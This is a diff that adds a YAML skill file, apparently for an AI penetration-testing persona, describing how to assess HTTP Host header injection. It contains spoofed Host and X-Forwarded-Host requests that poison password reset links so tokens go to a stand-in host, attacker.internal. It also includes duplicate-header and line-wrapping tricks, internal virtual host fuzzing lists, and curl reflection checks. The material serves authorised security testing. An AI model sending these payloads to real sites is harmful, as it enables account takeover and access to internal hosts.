@@ -1,0 +1,75 @@
+schema_version: 1
+version: 3.0.0
+name: host-header-injection
+description: Senior HTTP Host header and reverse proxy routing assessment — password reset poisoning, virtual host routing bypasses, and unkeyed cache reflection.
+triggers:
+  - host header
+  - host injection
+  - password reset poisoning
+  - x-forwarded-host
+  - virtual host
+  - vhost routing
+  - proxy normalization
+tools:
+  - curl
+knowledge: |
+  Audit HTTP Host header processing, reverse proxy routing rules, and password reset flows with senior offensive rigor.
+
+  1. HOST HEADER PROCESSING MECHANICS:
+     The `Host` header specifies the target virtual host. Web frameworks frequently construct links, redirects, and password reset URLs dynamically from the incoming request's `Host` header:
+     - Unsafe URL Generation Pattern:
+       `reset_url = "https://" + request.getHeader("Host") + "/reset?token=" + token;`
+     - Reverse Proxy Normalization Mismatches:
+       A front-end proxy may route traffic based on a fixed upstream rule or the request line (`GET http://internal.local/ HTTP/1.1`), while passing the untrusted client `Host` header directly to the application backend.
+
+  2. PASSWORD RESET POISONING (ACCOUNT TAKEOVER):
+     - Attack Mechanics:
+       1. Attacker initiates a password reset for a target account.
+       2. Request includes a spoofed Host or forwarding header:
+          `POST /forgot-password HTTP/1.1`
+          `Host: attacker.internal`
+          `X-Forwarded-Host: attacker.internal`
+          `Content-Type: application/json`
+          `{"email": "victim@target.local"}`
+       3. The backend generates a valid reset token and emails a link constructed from the poisoned Host header:
+          `https://attacker.internal/reset?token=<secret_reset_token>`
+       4. When the victim clicks the link, the token is transmitted directly to the attacker's server, resulting in full account compromise.
+
+  3. FORWARDING HEADER SPOOFING & OVERRIDES:
+     When the direct `Host` header is strictly validated by the edge web server, test secondary forwarding headers trusted by backend frameworks:
+     - `X-Forwarded-Host: attacker.internal`
+     - `X-Host: attacker.internal`
+     - `X-Forwarded-Server: attacker.internal`
+     - Duplicate Host Headers:
+       Send two `Host` headers in the same request to test parser precedence (e.g. edge proxy validates the first, backend processes the second):
+       `Host: target.local`
+       `Host: attacker.internal`
+     - Line Wrapping & Indentation (HTTP/1.1):
+       `Host: target.local`
+       ` Host: attacker.internal`
+
+  4. VIRTUAL HOST (VHOST) BRUTE-FORCING & ROUTING BYPASS:
+     Web servers serving multiple domains from a single IP address determine the virtual host via the `Host` header:
+     - Internal Virtual Host Enumeration:
+       Connect to the target IP address and fuzz the `Host` header with internal hostnames:
+       `Host: localhost`
+       `Host: 127.0.0.1`
+       `Host: admin.target.local`
+       `Host: internal.target.local`
+       `Host: staging.target.local`
+     - Port Manipulation in Host Header:
+       `Host: target.local:8080` or `Host: target.local:@attacker.internal`
+       Test if unhandled port delimiters trigger open redirects in redirect logic.
+
+  5. VERIFICATION METHODOLOGY & SAFETY STANDARDS:
+     - Check for Host reflection in HTTP redirect responses:
+       `curl -s -I -H "Host: attacker.internal" "https://target.local/" | grep -i "location:"`
+       A `Location: https://attacker.internal/` header in a 301/302 response confirms Host header reflection.
+     - Check for reflected links or script sources in HTML response bodies:
+       `curl -s -H "Host: attacker.internal" "https://target.local/" | grep "attacker.internal"`
+     - Always test password reset poisoning with operator-owned test email addresses.
+references:
+  - persona:host-header-injection-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/host-header-injection.yaml
